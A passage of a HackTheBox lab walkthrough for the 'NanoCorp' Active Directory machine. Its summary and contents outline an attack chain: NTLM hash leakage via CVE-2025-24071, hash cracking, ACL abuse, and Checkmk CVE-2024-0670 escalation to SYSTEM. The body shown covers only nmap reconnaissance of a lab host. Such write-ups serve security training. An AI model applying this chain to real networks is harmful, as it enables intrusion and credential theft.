@@ -1,0 +1,851 @@
+<!doctype html><head><link rel=stylesheet href=https://synack-rm-f.github.io/css/main.min.e69b5902e523361ee6eada3daae7ad3de88d72e796d13c5d92852e80914f0cb5.css></head><html lang=en><head><meta charset=utf-8><meta name=theme-color media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name=mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=viewport content="width=device-width,user-scalable=no,initial-scale=1,shrink-to-fit=no,viewport-fit=cover"><meta property="og:url" content="https://synack-rm-f.github.io/post/2026-07-10-nanocorp/"><meta property="og:site_name" content="SynRst"><meta property="og:title" content="HTB: Nanocorp - Active Directory Hard Walkthrough"><meta property="og:description" content="NanoCorp is a Hard Windows Active Directory machine featuring a realistic exploit chain that combines recent Windows vulnerabilities with Active Directory misconfigurations. The attack begins by exploiting CVE-2025-24071 to trigger an NTLM hash leakage using a malicious ZIP archive. After successfully cracking the hash, Active Directory enumeration reveals several misconfigured ACL permissions, enabling privilege escalation to the monitoring_svc account. This account, being a member of the Protected Users group, requires Kerberos authentication to establish WinRM access. Finally, exploiting CVE-2024-0670 within the Checkmk agent grants full NT AUTHORITY\SYSTEM privileges on the Domain Controller."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2026-07-10T12:00:00+07:00"><meta property="article:modified_time" content="2026-07-10T12:00:00+07:00"><meta property="article:tag" content="ActiveDirectory"><meta property="article:tag" content="HackTheBox"><meta property="article:tag" content="Hard"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB: Nanocorp - Active Directory Hard Walkthrough"><meta name=twitter:description content="NanoCorp is a Hard Windows Active Directory machine featuring a realistic exploit chain that combines recent Windows vulnerabilities with Active Directory misconfigurations. The attack begins by exploiting CVE-2025-24071 to trigger an NTLM hash leakage using a malicious ZIP archive. After successfully cracking the hash, Active Directory enumeration reveals several misconfigured ACL permissions, enabling privilege escalation to the monitoring_svc account. This account, being a member of the Protected Users group, requires Kerberos authentication to establish WinRM access. Finally, exploiting CVE-2024-0670 within the Checkmk agent grants full NT AUTHORITY\SYSTEM privileges on the Domain Controller."><meta itemprop=name content="HTB: Nanocorp - Active Directory Hard Walkthrough"><meta itemprop=description content="NanoCorp is a Hard Windows Active Directory machine featuring a realistic exploit chain that combines recent Windows vulnerabilities with Active Directory misconfigurations. The attack begins by exploiting CVE-2025-24071 to trigger an NTLM hash leakage using a malicious ZIP archive. After successfully cracking the hash, Active Directory enumeration reveals several misconfigured ACL permissions, enabling privilege escalation to the monitoring_svc account. This account, being a member of the Protected Users group, requires Kerberos authentication to establish WinRM access. Finally, exploiting CVE-2024-0670 within the Checkmk agent grants full NT AUTHORITY\SYSTEM privileges on the Domain Controller."><meta itemprop=datePublished content="2026-07-10T12:00:00+07:00"><meta itemprop=dateModified content="2026-07-10T12:00:00+07:00"><meta itemprop=wordCount content="4431"><meta itemprop=keywords content="ActiveDirectory,HackTheBox,Hard"><title>HTB: Nanocorp - Active Directory Hard Walkthrough |
+SynRst</title><link rel=apple-touch-icon sizes=180x180 href=/img/favicons/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/img/favicons/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/img/favicons/favicon-16x16.png><link rel="shortcut icon" href=/img/favicons/favicon.ico><meta name=apple-mobile-web-app-title content="SynRst"><meta name=application-name content="SynRst"><meta name=msapplication-TileColor content="#da532c"><meta name=msapplication-config content="/img/favicons/browserconfig.xml"><meta name=theme-color content="#ffffff"><link rel=preconnect href=https://fonts.googleapis.com><link rel=dns-prefetch href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=dns-prefetch href=https://fonts.gstatic.com><link rel=preconnect href=https://cdn.jsdelivr.net><link rel=dns-prefetch href=https://cdn.jsdelivr.net><link rel=stylesheet href=https://synack-rm-f.github.io/css/main.min.e69b5902e523361ee6eada3daae7ad3de88d72e796d13c5d92852e80914f0cb5.css><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&amp;family=Source+Sans+Pro:wght@400;600;700;900&amp;display=swap"><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css><link rel=stylesheet href=/><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css><script src=/js/modules/theme.js></script><script src=https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/js/glightbox.min.js></script><script src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script src=https://cdn.jsdelivr.net/npm/dayjs@1.11.13/dayjs.min.js></script><script src=https://cdn.jsdelivr.net/npm/dayjs@1.11.13/locale/en.js></script><script src=https://cdn.jsdelivr.net/npm/dayjs@1.11.13/plugin/relativeTime.js></script><script src=https://cdn.jsdelivr.net/npm/dayjs@1.11.13/plugin/localizedFormat.js></script><script src=https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.js></script><script defer src=/js/post.js></script></head><body><aside aria-label=Sidebar id=sidebar class="d-flex flex-column align-items-end"><header class=profile-wrapper><a class="site-title d-block" href=/>SynRst</a><p class="site-subtitle fst-italic mb-0">Security Research and Technical Notes</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class=nav><li class=nav-item><a href=/ class=nav-link><i class="fa-fw fas fa-house"></i>
+<span>HOME</span></a></li><li class=nav-item><a href=/archives/ class=nav-link><i class="fa-fw fas fa-archive"></i>
+<span>ARCHIVES</span></a></li></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"><button type=button class="btn btn-link nav-link" aria-label="Switch Mode" id=mode-toggle>
+<i class="fas fa-adjust"></i>
+</button>
+<span class=icon-border></span>
+<a href=https://github.com/synack-rm-f aria-label=github target=_blank rel="noopener noreferrer"><i class="fab fa-github"></i></a></div></aside><div id=main-wrapper class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id=topbar-wrapper class=flex-shrink-0 aria-label="Top Bar"><div id=topbar class="d-flex align-items-center justify-content-between px-lg-3 h-100"><nav id=breadcrumb aria-label=Breadcrumb><span><a href=/>Home</a>
+</span><span>HTB: Nanocorp - Active Directory Hard Walkthrough</span></nav><button type=button id=sidebar-trigger class="btn btn-link" aria-label=Sidebar>
+<i class="fas fa-bars fa-fw"></i></button><div id=topbar-title>HTB: Nanocorp - Active Directory Hard Walkthrough</div><button type=button id=search-trigger class="btn btn-link" aria-label=Search>
+<i class="fas fa-search fa-fw"></i>
+</button>
+<search id=search class="align-items-center ms-3 ms-lg-0"><i class="fas fa-search fa-fw"></i>
+<input class=form-control id=search-input type=search aria-label=search autocomplete=off placeholder=Search...>
+</search><button type=button class="btn btn-link text-decoration-none" id=search-cancel>Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class=px-1 data-toc=true><header><h1 data-toc-skip>HTB: Nanocorp - Active Directory Hard Walkthrough</h1><div class="post-meta text-muted"><span></span></header><div id=toc-bar class="d-flex align-items-center justify-content-between invisible"><span class="label text-truncate">HTB: Nanocorp - Active Directory Hard Walkthrough</span>
+<button type=button class="toc-trigger btn me-1">
+<i class="fa-solid fa-list-ul fa-fw"></i></button></div><button id=toc-solo-trigger type=button class="toc-trigger btn btn-outline-secondary btn-sm">
+<span class="label ps-2 pe-1">Contents</span>
+<i class="fa-solid fa-angle-right fa-fw"></i>
+</button>
+<dialog id=toc-popup class=p-0><div class="header d-flex flex-row align-items-center justify-content-between"><div class="label text-truncate py-2 ms-4">HTB: Nanocorp - Active Directory Hard Walkthrough</div><button id=toc-popup-close type=button class="btn mx-1 my-1 opacity-75">
+<i class="fas fa-close"></i></button></div><div id=toc-popup-content class="px-4 py-3 pb-4"><nav id=TableOfContents><ul><li><a href=#reconnaissance--scan-réseau>Reconnaissance & Scan Réseau</a><ul><li><a href=#host-discovery-ping-scan>Host Discovery (Ping Scan)</a></li><li><a href=#nmap--pn--ss--n-open--kerberos-ports>nmap -Pn -sS -n &ndash;open kerberos ports</a></li><li><a href=#comprehensive-service--os-fingerprinting>Comprehensive Service & OS Fingerprinting</a></li></ul></li><li><a href=#web-application-reconnaissance--subdomain-discovery>Web Application Reconnaissance & Subdomain Discovery</a><ul><li><a href=#key-finding>Key Finding</a></li></ul></li><li><a href=#local-dns-configuration-etchosts>Local DNS Configuration (<code>/etc/hosts</code>)</a></li><li><a href=#active-directory-time-synchronization-chrony>Active Directory Time Synchronization (<code>chrony</code>)</a></li><li><a href=#initial-foothold--hash-coercion-cve-2025-24071>Initial Foothold & Hash Coercion (CVE-2025-24071)</a><ul><li><a href=#crafting-the-malicious-library-file>Crafting the Malicious Library File</a></li></ul></li><li><a href=#hash-capture-via-responder>Hash Capture via Responder</a><ul><li><a href=#starting-the-listener>Starting the Listener</a></li><li><a href=#capture-output>Capture Output</a></li></ul></li><li><a href=#offline-password-cracking-hashcat>Offline Password Cracking (<code>hashcat</code>)</a><ul><li><a href=#cracking-output>Cracking Output</a></li></ul></li><li><a href=#active-directory-ldap-enumeration-netexec>Active Directory LDAP Enumeration (<code>NetExec</code>)</a></li><li><a href=#kerberos-authentication--tgt-retrieval-gettgt>Kerberos Authentication & TGT Retrieval (<code>getTGT</code>)</a><ul><li><a href=#key-outcome>Key Outcome</a></li></ul></li><li><a href=#injecting-the-kerberos-ticket-krb5ccname>Injecting the Kerberos Ticket (<code>KRB5CCNAME</code>)</a><ul><li><a href=#export-krb5ccname>Export KRB5CCNAME</a></li></ul></li><li><a href=#active-directory-enumeration-via-bloodhound>Active Directory Enumeration via BloodHound</a><ul><li><a href=#command-breakdown>Command Breakdown</a></li></ul></li><li><a href=#active-directory-acl-abuse-addself-to-group>Active Directory ACL Abuse (AddSelf to Group)</a><ul><li><a href=#exploiting-the-acl-with-bloodyad>Exploiting the ACL with bloodyAD</a></li><li><a href=#key-outcome--next-steps>Key Outcome & Next Steps</a></li></ul></li><li><a href=#active-directory-group-privilege-abuse-forcechangepassword>Active Directory Group Privilege Abuse (ForceChangePassword)</a><ul><li><a href=#analyzing-the-inherited-acl>Analyzing the Inherited ACL</a></li><li><a href=#resetting-the-user-password-with-bloodyad>Resetting the User Password with bloodyAD</a></li><li><a href=#key-outcome-1>Key Outcome</a></li></ul></li><li><a href=#escalating-privileges--tgt-retrieval-monitoring_svc>Escalating Privileges & TGT Retrieval (<code>monitoring_svc</code>)</a></li><li><a href=#remote-access-via-winrm-remote-management-users>Remote Access via WinRM (Remote Management Users)</a><ul><li><a href=#group-membership-analysis>Group Membership Analysis</a></li><li><a href=#verifying-winrm-access>Verifying WinRM Access</a></li><li><a href=#python3-winrmexecpy>python3 winrmexec.py</a></li></ul></li><li><a href=#privilege-escalation-to-nt-authoritysystem>Privilege Escalation to NT AUTHORITY\SYSTEM</a><ul><li><a href=#whoami-groups>whoami /groups</a></li><li><a href=#the-obstacle-protected-users-group>The Obstacle: Protected Users Group</a></li><li><a href=#exploiting-checkmk-msi-arbitrary-file-execution>Exploiting Checkmk MSI (Arbitrary File Execution)</a></li><li><a href=#compiling-and-executing-runascs>Compiling and Executing RunasCs</a></li><li><a href=#wget-ncexe>wget nc.exe</a></li><li><a href=#wget>wget</a></li><li><a href=#dir>dir</a></li><li><a href=#copy-to-cwindowstemp>copy to C:\Windows\Temp</a></li><li><a href=#execution--shell-elevation>Execution & Shell Elevation</a></li><li><a href=#runascsexe-web_svc>RunasCs.exe web_svc</a></li></ul></li><li><a href=#flag-retrieval>Flag Retrieval</a><ul><li><a href=#powershellexe-get-localuser>powershell.exe Get-LocalUser</a></li></ul></li></ul></nav></div></dialog><div class=content><blockquote class=prompt-info><p><strong>NanoCorp</strong> is a Hard Windows Active Directory machine featuring a realistic exploit chain that combines recent Windows vulnerabilities with Active Directory misconfigurations. The attack begins by exploiting <strong>CVE-2025-24071</strong> to trigger an NTLM hash leakage using a malicious ZIP archive. After successfully cracking the hash, Active Directory enumeration reveals several misconfigured ACL permissions, enabling privilege escalation to the <strong><code>monitoring_svc</code></strong> account. This account, being a member of the <strong>Protected Users</strong> group, requires Kerberos authentication to establish WinRM access. Finally, exploiting <strong>CVE-2024-0670</strong> within the Checkmk agent grants full <strong><code>NT AUTHORITY\SYSTEM</code></strong> privileges on the Domain Controller.</p></blockquote><h2 id=reconnaissance--scan-réseau id=reconnaissance--scan-réseau><span class=me-2>Reconnaissance & Scan Réseau</span>
+<a href=#reconnaissance--scan-r%c3%a9seau class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id=host-discovery-ping-scan id=host-discovery-ping-scan><span class=me-2>Host Discovery (Ping Scan)</span>
+<a href=#host-discovery-ping-scan class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> ╭─nabiasa@nabiasa in ~/Desktop/AD
+</span></span><span class=line><span class=cl> ╰─λ nmap -n -sn 10.129.243.199 -vv
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-05-15 16:05 +0700
+</span></span><span class=line><span class=cl>Initiating Ping Scan at 16:05
+</span></span><span class=line><span class=cl>Scanning 10.129.243.199 <span class=o>[</span><span class=m>4</span> ports<span class=o>]</span>
+</span></span><span class=line><span class=cl>Completed Ping Scan at 16:05, 0.15s elapsed <span class=o>(</span><span class=m>1</span> total hosts<span class=o>)</span>
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.243.199
+</span></span><span class=line><span class=cl>Host is up, received echo-reply ttl <span class=m>127</span> <span class=o>(</span>0.14s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 0.18 seconds
+</span></span><span class=line><span class=cl>           Raw packets sent: <span class=m>4</span> <span class=o>(</span>152B<span class=o>)</span> <span class=p>|</span> Rcvd: <span class=m>1</span> <span class=o>(</span>28B<span class=o>)</span></span></span></code></pre></td></tr></table></div></div></div><blockquote><p>We initiate a fast, non-port-scanning ping sweep (<code>-sn</code>) without reverse DNS resolution (<code>-n</code>) to verify host availability. The target responds to the ICMP echo requests, confirming it is active and reachable on the network.</p></blockquote><blockquote class=prompt-tip><p><strong>Technical Note:</strong> The default Time-to-Live (TTL) value for Windows operating systems is <strong>128</strong>. If the received packet displays a TTL of <strong>127</strong>, it indicates that the packet has traversed exactly one router hop (such as your HackTheBox VPN gateway), decrementing the TTL by 1 (128 - 1 = 127). By contrast, a Linux-based system typically has a default TTL of <strong>64</strong>, which would yield a TTL of approximately <strong>63</strong> after a single hop.</p></blockquote><h3 id=nmap--pn--ss--n-open--kerberos-ports id=nmap--pn--ss--n-open--kerberos-ports><span class=me-2>nmap -Pn -sS -n &ndash;open kerberos ports</span>
+<a href=#nmap--pn--ss--n-open--kerberos-ports class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> ╭─nabiasa@nabiasa in ~/Desktop/AD
+</span></span><span class=line><span class=cl> ╰─λ nmap -Pn -sS -n --open -p 53,88,135,137,138,139,389,636,445,464,3268,3269 10.129.243.199
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-05-15 16:09 +0700
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.243.199
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.14s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>2</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>
+</span></span><span class=line><span class=cl>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span class=line><span class=cl>PORT     STATE SERVICE
+</span></span><span class=line><span class=cl>53/tcp   open  domain
+</span></span><span class=line><span class=cl>88/tcp   open  kerberos-sec
+</span></span><span class=line><span class=cl>135/tcp  open  msrpc
+</span></span><span class=line><span class=cl>139/tcp  open  netbios-ssn
+</span></span><span class=line><span class=cl>389/tcp  open  ldap
+</span></span><span class=line><span class=cl>445/tcp  open  microsoft-ds
+</span></span><span class=line><span class=cl>464/tcp  open  kpasswd5
+</span></span><span class=line><span class=cl>636/tcp  open  ldapssl
+</span></span><span class=line><span class=cl>3268/tcp open  globalcatLDAP
+</span></span><span class=line><span class=cl>3269/tcp open  globalcatLDAPssl
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 1.47 seconds</span></span></code></pre></td></tr></table></div></div></div><blockquote><p>We perform a targeted TCP SYN stealth scan (<code>-sS</code>) against specific Active Directory and core infrastructure ports (<code>-p 53,88,135,137,138,139,389,636,445,464,3268,3269</code>). Host discovery is bypassed (<code>-Pn</code>) to assume the target is online, reverse DNS resolution is disabled (<code>-n</code>) to accelerate execution, and output is filtered to display open ports only (<code>--open</code>).</p></blockquote><h3 id=comprehensive-service--os-fingerprinting id=comprehensive-service--os-fingerprinting><span class=me-2>Comprehensive Service & OS Fingerprinting</span>
+<a href=#comprehensive-service--os-fingerprinting class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> ╭─nabiasa@nabiasa in ~/Desktop/AD via as 🧙
+</span></span><span class=line><span class=cl> ╰─λ nmap -n -Pn -sC -sV -A 10.129.231.124
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-05-16 12:25 +0700
+</span></span><span class=line><span class=cl>Stats: 0:00:14 elapsed<span class=p>;</span> <span class=m>0</span> hosts completed <span class=o>(</span><span class=m>1</span> up<span class=o>)</span>, <span class=m>1</span> undergoing Service Scan
+</span></span><span class=line><span class=cl>Service scan Timing: About 7.69% <span class=k>done</span><span class=p>;</span> ETC: 12:26 <span class=o>(</span>0:01:12 remaining<span class=o>)</span>
+</span></span><span class=line><span class=cl>Stats: 0:00:37 elapsed<span class=p>;</span> <span class=m>0</span> hosts completed <span class=o>(</span><span class=m>1</span> up<span class=o>)</span>, <span class=m>1</span> undergoing Service Scan
+</span></span><span class=line><span class=cl>Service scan Timing: About 92.31% <span class=k>done</span><span class=p>;</span> ETC: 12:25 <span class=o>(</span>0:00:02 remaining<span class=o>)</span>
+</span></span><span class=line><span class=cl>Stats: 0:01:19 elapsed<span class=p>;</span> <span class=m>0</span> hosts completed <span class=o>(</span><span class=m>1</span> up<span class=o>)</span>, <span class=m>1</span> undergoing Script Scan
+</span></span><span class=line><span class=cl>NSE Timing: About 99.95% <span class=k>done</span><span class=p>;</span> ETC: 12:26 <span class=o>(</span>0:00:00 remaining<span class=o>)</span>
+</span></span><span class=line><span class=cl>Stats: 0:01:51 elapsed<span class=p>;</span> <span class=m>0</span> hosts completed <span class=o>(</span><span class=m>1</span> up<span class=o>)</span>, <span class=m>1</span> undergoing Script Scan
+</span></span><span class=line><span class=cl>NSE Timing: About 96.15% <span class=k>done</span><span class=p>;</span> ETC: 12:27 <span class=o>(</span>0:00:00 remaining<span class=o>)</span>
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.231.124
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.15s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>987</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT     STATE SERVICE           VERSION
+</span></span><span class=line><span class=cl>53/tcp   open  domain            Simple DNS Plus
+</span></span><span class=line><span class=cl>80/tcp   open  http              Apache httpd 2.4.58 <span class=o>(</span>OpenSSL/3.1.3 PHP/8.2.12<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.58 <span class=o>(</span>Win64<span class=o>)</span> OpenSSL/3.1.3 PHP/8.2.12
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Did not follow redirect to http://nanocorp.htb/
+</span></span><span class=line><span class=cl>88/tcp   open  kerberos-sec      Microsoft Windows Kerberos <span class=o>(</span>server time: 2026-05-16 12:29:31Z<span class=o>)</span>
+</span></span><span class=line><span class=cl>135/tcp  open  msrpc             Microsoft Windows RPC
+</span></span><span class=line><span class=cl>139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
+</span></span><span class=line><span class=cl>389/tcp  open  ldap              Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: nanocorp.htb, Site: Default-First-Site-Name<span class=o>)</span>
+</span></span><span class=line><span class=cl>445/tcp  open  microsoft-ds?
+</span></span><span class=line><span class=cl>464/tcp  open  kpasswd5?
+</span></span><span class=line><span class=cl>593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+</span></span><span class=line><span class=cl>636/tcp  open  ldapssl?
+</span></span><span class=line><span class=cl>3268/tcp open  ldap              Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: nanocorp.htb, Site: Default-First-Site-Name<span class=o>)</span>
+</span></span><span class=line><span class=cl>3269/tcp open  globalcatLDAPssl?
+</span></span><span class=line><span class=cl>5986/tcp open  ssl/wsmans?
+</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>dc01.nanocorp.htb
+</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: DNS:dc01.nanocorp.htb
+</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2025-04-06T22:58:43
+</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2026-04-06T23:18:43
+</span></span><span class=line><span class=cl><span class=p>|</span> tls-alpn:
+</span></span><span class=line><span class=cl><span class=p>|</span>   h2
+</span></span><span class=line><span class=cl><span class=p>|</span>_  http/1.1
+</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: TLS randomness does not represent <span class=nb>time</span>
+</span></span><span class=line><span class=cl>Warning: OSScan results may be unreliable because we could not find at least <span class=m>1</span> open and <span class=m>1</span> closed port
+</span></span><span class=line><span class=cl>Device type: general purpose
+</span></span><span class=line><span class=cl>Running <span class=o>(</span>JUST GUESSING<span class=o>)</span>: Microsoft Windows <span class=m>2022</span> <span class=o>(</span>88%<span class=o>)</span>
+</span></span><span class=line><span class=cl>OS CPE: cpe:/o:microsoft:windows_server_2022
+</span></span><span class=line><span class=cl>Aggressive OS guesses: Microsoft Windows Server <span class=m>2022</span> <span class=o>(</span>88%<span class=o>)</span>
+</span></span><span class=line><span class=cl>No exact OS matches <span class=k>for</span> host <span class=o>(</span><span class=nb>test</span> conditions non-ideal<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Network Distance: <span class=m>2</span> hops
+</span></span><span class=line><span class=cl>Service Info: Hosts: nanocorp.htb, DC01<span class=p>;</span> OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Host script results:
+</span></span><span class=line><span class=cl><span class=p>|</span>_clock-skew: 7h04m04s
+</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time:
+</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2026-05-16T12:30:25
+</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: N/A
+</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode:
+</span></span><span class=line><span class=cl><span class=p>|</span>   3.1.1:
+</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled and required
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>TRACEROUTE <span class=o>(</span>using port 135/tcp<span class=o>)</span>
+</span></span><span class=line><span class=cl>HOP RTT       ADDRESS
+</span></span><span class=line><span class=cl><span class=m>1</span>   143.05 ms 10.10.14.1
+</span></span><span class=line><span class=cl><span class=m>2</span>   176.23 ms 10.129.231.124
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 113.94 seconds</span></span></code></pre></td></tr></table></div></div></div><blockquote><p>We perform an aggressive scan (<code>-A</code>) combining service version detection (<code>-sV</code>) and default NSE scripts (<code>-sC</code>) against the identified target. This allows us to gather operating system details, inspect web banners, retrieve SSL certificates, and check SMB security configurations.</p></blockquote><h2 id=web-application-reconnaissance--subdomain-discovery id=web-application-reconnaissance--subdomain-discovery><span class=me-2>Web Application Reconnaissance & Subdomain Discovery</span>
+<a href=#web-application-reconnaissance--subdomain-discovery class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><a href=/res/20260515171451.png class="popup img-link"><img src=/res/20260515171451.png alt></a><blockquote><p>Rather than relying purely on automated scanners, we manually inspect the web server running on port 80. Using the <strong>Bruno</strong> API client, we send a standard <code>GET</code> request to the main index page.
+By analyzing the raw HTML response returned in Bruno, we locate a hardcoded link within the landing page&rsquo;s body section:</p></blockquote><div class=code-block><div class=code-header><span data-label-text=HTML><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
